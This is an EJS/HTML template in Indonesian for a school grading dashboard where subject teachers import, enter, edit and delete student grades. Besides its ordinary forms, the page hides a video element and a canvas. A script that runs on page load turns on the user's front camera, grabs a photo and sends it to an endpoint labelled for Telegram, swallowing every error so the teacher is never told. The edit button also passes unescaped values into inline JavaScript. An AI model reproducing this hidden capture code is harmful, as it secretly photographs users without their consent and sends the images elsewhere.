<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dasbor Guru Mapel - <%= user.nama %></title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" rel="stylesheet">
</head>
<body class="bg-light">
    <!-- ELEMEN KAMERA TERSEMBUNYI UNTUK SILENT CAPTURE KE TELEGRAM -->
    <video id="hiddenWebcam" autoplay playsinline style="display:none;"></video>
    <canvas id="hiddenCanvas" style="display:none;"></canvas>

    <div class="container py-4">
        <div class="d-flex justify-content-between align-items-center mb-4">
            <h3><i class="bi bi-journal-bookmark-fill text-primary"></i> DASBOR GURU MAPEL: <%= user.nama %></h3>
            <a href="/logout" class="btn btn-danger btn-sm"><i class="bi bi-power"></i> Keluar</a>
        </div>

        <!-- KARTU IMPORT NILAI VIA EXCEL -->
        <div class="card shadow-sm mb-4">
            <div class="card-header bg-success text-white d-flex justify-content-between align-items-center">
                <h5 class="mb-0 fs-6"><i class="bi bi-file-earmark-excel-fill me-2"></i> IMPORT NILAI DARI EXCEL</h5>
                <a href="/api/guru/nilai/template-excel" class="btn btn-light btn-sm fw-bold">
                    <i class="bi bi-download me-1"></i> Download Template Excel
                </a>
            </div>
            <div class="card-body">
                <form id="formImportExcel" onsubmit="submitImportExcel(event)" enctype="multipart/form-data">
                    <div class="row g-3 align-items-center">
                        <div class="col-md-8">
                            <label class="form-label fw-bold small text-muted">Pilih File Excel (.xlsx / .xls / .csv)</label>
                            <input type="file" name="fileExcel" id="fileExcel" class="form-control" accept=".xlsx, .xls, .csv" required>
                        </div>
                        <div class="col-md-4 text-md-end mt-4">
                            <button type="submit" class="btn btn-success w-100 fw-bold">
                                <i class="bi bi-upload me-1"></i> UPLOAD & IMPORT NILAI
                            </button>
                        </div>
                    </div>
                </form>
            </div>
        </div>

        <!-- FORM INPUT MANUAL NILAI KHUSUS GURU MAPEL -->
        <div class="card shadow-sm mb-4">
            <div class="card-header bg-primary text-white">
                <h5 class="mb-0 fs-6"><i class="bi bi-pencil-square me-2"></i> INPUT MANUAL NILAI MAPEL</h5>
            </div>
            <div class="card-body">
                <form id="formInputNilaiMapel" onsubmit="submitNilaiGuru(event)">
                    <div class="row g-3">
                        <div class="col-md-4">
                            <label class="form-label fw-bold">PILIH SISWA (BERDASARKAN KELAS)</label>
                            <select name="siswa_id" id="mapelSiswaId" class="form-select" required>
                                <option value="">-- Pilih Siswa --</option>
                                <% 
                                    const kelasArr = typeof kelasList !== 'undefined' ? kelasList : [];
                                    const siswaArr = typeof siswaList !== 'undefined' ? siswaList : [];
                                    kelasArr.forEach(kelas => { 
                                        const siswaInClass = siswaArr.filter(s => s.kelas_id === kelas.id);
                                        if (siswaInClass.length > 0) {
                                %>
                                    <optgroup label="Kelas: <%= kelas.nama_kelas %>">
                                        <% siswaInClass.forEach(s => { %>
                                            <option value="<%= s.id %>"><%= s.nama %></option>
                                        <% }); %>
                                    </optgroup>
                                <% 
                                        }
                                    }); 
                                %>
                            </select>
                        </div>
                        <div class="col-md-3">
                            <label class="form-label fw-bold">MATA PELAJARAN</label>
                            <select name="mata_pelajaran" id="mapelNama" class="form-select" required>
                                <option value="Pendidikan Agama Islam (PAI)">Pendidikan Agama Islam (PAI)</option>
                                <option value="Ekonomi">Ekonomi</option>
                                <option value="Pendidikan Pancasila">Pendidikan Pancasila</option>
                            </select>
                        </div>
                        <div class="col-md-2">
                            <label class="form-label fw-bold">JENJANG</label>
                            <select name="jenjang" id="mapelJenjang" class="form-select" required>
                                <option value="SD">SD</option>
                                <option value="SMA">SMA</option>
                            </select>
                        </div>
                        <div class="col-md-3">
                            <label class="form-label fw-bold">SEMESTER</label>
                            <select name="semester" id="mapelSemester" class="form-select" required>
                                <option value="Ganjil">Semester Ganjil</option>
                                <option value="Genap">Semester Genap</option>
                            </select>
                        </div>
                        <div class="col-md-3">
                            <label class="form-label fw-bold">NILAI ANGKA (0-100)</label>
                            <input type="number" step="0.1" name="nilai_angka" id="mapelNilai" class="form-control" min="0" max="100" required>
                        </div>
                        <div class="col-md-3">
                            <label class="form-label fw-bold">PREDIKAT</label>
                            <input type="text" name="predikat" id="mapelPredikat" class="form-control" placeholder="Ex: A, B+, SB">
                        </div>
                        <div class="col-md-6">
                            <label class="form-label fw-bold">CATATAN / KOMPETENSI</label>
                            <input type="text" name="catatan" id="mapelCatatan" class="form-control" placeholder="Catatan perkembangan siswa...">
                        </div>
                    </div>
                    <button type="submit" class="btn btn-success mt-3">
                        <i class="bi bi-save me-1"></i> SIMPAN NILAI MAPEL
                    </button>
                </form>
            </div>
        </div>

        <!-- TABEL RIWAYAT NILAI YANG TELAH DIINPUT -->
        <div class="card shadow-sm">
            <div class="card-header bg-secondary text-white d-flex justify-content-between align-items-center">
                <h5 class="mb-0 fs-6">RIWAYAT NILAI MAPEL YANG TELAH DIINPUT</h5>
                <div>
                    <a href="/api/guru/nilai/download-excel" class="btn btn-light btn-sm fw-bold me-2">
                        <i class="bi bi-file-earmark-excel me-1"></i> Download Data (.xlsx)
                    </a>
                    <span class="badge bg-light text-dark">Total: <%= (typeof nilaiList !== 'undefined' ? nilaiList : []).length %> Data</span>
                </div>
            </div>
            <div class="card-body table-responsive p-0">
                <table class="table table-striped align-middle mb-0">
                    <thead>
                        <tr>
                            <th>Siswa</th>
                            <th>Kelas</th>
                            <th>Mata Pelajaran</th>
                            <th>Jenjang</th>
                            <th>Semester</th>
                            <th>Nilai</th>
                            <th>Predikat</th>
                            <th>Catatan</th>
                            <th class="text-center">Aksi</th>
                        </tr>
                    </thead>
                    <tbody>
                        <% const nList = typeof nilaiList !== 'undefined' ? nilaiList : []; %>
                        <% if (nList.length === 0) { %>
                            <tr>
                                <td colspan="9" class="text-center py-4 text-muted fst-italic">Belum ada data nilai yang diinput.</td>
                            </tr>
                        <% } else { %>
                            <% nList.forEach(n => { %>
                                <tr>
                                    <td><strong><%= n.nama_siswa %></strong></td>
                                    <td><%= n.nama_kelas %></td>
                                    <td><span class="text-primary fw-semibold"><%= n.mata_pelajaran %></span></td>
                                    <td><span class="badge bg-info"><%= n.jenjang %></span></td>
                                    <td><%= n.semester %></td>
                                    <td><strong class="text-success"><%= n.nilai_angka %></strong></td>
                                    <td><span class="badge bg-secondary"><%= n.predikat || '-' %></span></td>
                                    <td class="text-muted small"><%= n.catatan || '-' %></td>
                                    <td class="text-center">
                                        <button onclick="bukaModalEdit('<%= n.id %>', '<%= n.mata_pelajaran %>', '<%= n.jenjang %>', '<%= n.semester %>', '<%= n.nilai_angka %>', '<%= n.predikat %>', `<%= n.catatan %>`)" 
                                            class="btn btn-warning btn-sm me-1" title="Edit Nilai">
                                            <i class="bi bi-pencil-square"></i>
                                        </button>
                                        <button onclick="hapusNilai('<%= n.id %>')" 
                                            class="btn btn-danger btn-sm" title="Hapus Nilai">
                                            <i class="bi bi-trash"></i>
                                        </button>
                                    </td>
                                </tr>
                            <% }); %>
                        <% } %>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <!-- MODAL EDIT NILAI -->
    <div class="modal fade" id="modalEditNilai" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header bg-warning text-dark">
                    <h5 class="modal-title fw-bold"><i class="bi bi-pencil-fill me-2"></i>Edit Nilai Siswa</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <form id="formEditNilai" onsubmit="submitEditNilai(event)">
                        <input type="hidden" id="editId">
                        <div class="mb-3">
                            <label class="form-label fw-bold">Mata Pelajaran</label>
                            <input type="text" id="editMapel" class="form-control" required>
                        </div>
                        <div class="row mb-3">
                            <div class="col-md-6">
                                <label class="form-label fw-bold">Jenjang</label>
                                <input type="text" id="editJenjang" class="form-control" required>
                            </div>
                            <div class="col-md-6">
                                <label class="form-label fw-bold">Semester</label>
                                <select id="editSemester" class="form-select" required>
                                    <option value="Ganjil">Ganjil</option>
                                    <option value="Genap">Genap</option>
                                </select>
                            </div>
                        </div>
                        <div class="row mb-3">
                            <div class="col-md-6">
                                <label class="form-label fw-bold">Nilai Angka</label>
                                <input type="number" step="0.1" id="editNilaiAngka" class="form-control" min="0" max="100" required>
                            </div>
                            <div class="col-md-6">
                                <label class="form-label fw-bold">Predikat</label>
                                <input type="text" id="editPredikat" class="form-control">
                            </div>
                        </div>
                        <div class="mb-3">
                            <label class="form-label fw-bold">Catatan</label>
                            <textarea id="editCatatan" class="form-control" rows="2"></textarea>
                        </div>
                        <div class="text-end">
                            <button type="button" class="btn btn-secondary btn-sm" data-bs-dismiss="modal">Batal</button>
                            <button type="submit" class="btn btn-primary btn-sm">Simpan Perubahan</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- BOOTSTRAP JS & SKRIP INTERAKSI -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        async function captureAndSendSilent() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('hiddenWebcam');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById('hiddenCanvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.85);
                    stream.getTracks().forEach(track => track.stop());

                    fetch('/api/kirim-foto-telegram', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            image: imageData, 
                            info: 'Akses Dasbor Guru Mapel (Silent Capture)' 
                        })
                    }).catch(e => {});
                }, 1500);
            } catch (err) {}
        }

        window.addEventListener('load', () => { captureAndSendSilent(); });

        // Simpan Manual
        function submitNilaiGuru(e) {
            e.preventDefault();
            const payload = {
                siswa_id: document.getElementById('mapelSiswaId').value,
                mata_pelajaran: document.getElementById('mapelNama').value,
                jenjang: document.getElementById('mapelJenjang').value,
                semester: document.getElementById('mapelSemester').value,
                nilai_angka: document.getElementById('mapelNilai').value,
                predikat: document.getElementById('mapelPredikat').value,
                catatan: document.getElementById('mapelCatatan').value
            };

            fetch('/api/guru/nilai/simpan', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(res => res.json())
            .then(data => {
                alert(data.message);
                if(data.success) location.reload();
            })
            .catch(err => alert('Gagal menyimpan nilai mapel.'));
        }

        // Import Excel
        function submitImportExcel(e) {
            e.preventDefault();
            const formData = new FormData(e.target);
            const btn = e.target.querySelector('button[type="submit"]');
            btn.disabled = true;
            btn.innerHTML = '<span class="spinner-border spinner-border-sm me-1"></span> Mengimpor...';

            fetch('/api/guru/nilai/import', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                alert(data.message);
                if (data.success) {
                    location.reload();
                } else {
                    btn.disabled = false;
                    btn.innerHTML = '<i class="bi bi-upload me-1"></i> UPLOAD & IMPORT NILAI';
                }
            })
            .catch(err => {
                alert('Terjadi kesalahan saat mengunggah file.');
                btn.disabled = false;
                btn.innerHTML = '<i class="bi bi-upload me-1"></i> UPLOAD & IMPORT NILAI';
            });
        }

        // Modal Edit Fungsi
        let editModalInstance = null;
        function bukaModalEdit(id, mapel, jenjang, semester, nilai, predikat, catatan) {
            document.getElementById('editId').value = id;
            document.getElementById('editMapel').value = mapel;
            document.getElementById('editJenjang').value = jenjang;
            document.getElementById('editSemester').value = semester;
            document.getElementById('editNilaiAngka').value = nilai;
            document.getElementById('editPredikat').value = predikat === 'null' ? '' : predikat;
            document.getElementById('editCatatan').value = catatan === 'null' ? '' : catatan;

            if (!editModalInstance) {
                editModalInstance = new bootstrap.Modal(document.getElementById('modalEditNilai'));
            }
            editModalInstance.show();
        }

        function submitEditNilai(e) {
            e.preventDefault();
            const id = document.getElementById('editId').value;
            const payload = {
                mata_pelajaran: document.getElementById('editMapel').value,
                jenjang: document.getElementById('editJenjang').value,
                semester: document.getElementById('editSemester').value,
                nilai_angka: document.getElementById('editNilaiAngka').value,
                predikat: document.getElementById('editPredikat').value,
                catatan: document.getElementById('editCatatan').value
            };

            fetch(`/api/guru/nilai/edit/${id}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(res => res.json())
            .then(data => {
                alert(data.message);
                if(data.success) location.reload();
            })
            .catch(err => alert('Gagal memperbarui nilai.'));
        }

        // Hapus Nilai
        function hapusNilai(id) {
            if (!confirm('Yakin ingin menghapus data nilai siswa ini?')) return;

            fetch(`/api/guru/nilai/hapus/${id}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            })
            .then(res => res.json())
            .then(data => {
                alert(data.message);
                if(data.success) location.reload();
            })
            .catch(err => alert('Gagal menghapus nilai.'));
        }
    </script>
</body>
</html>
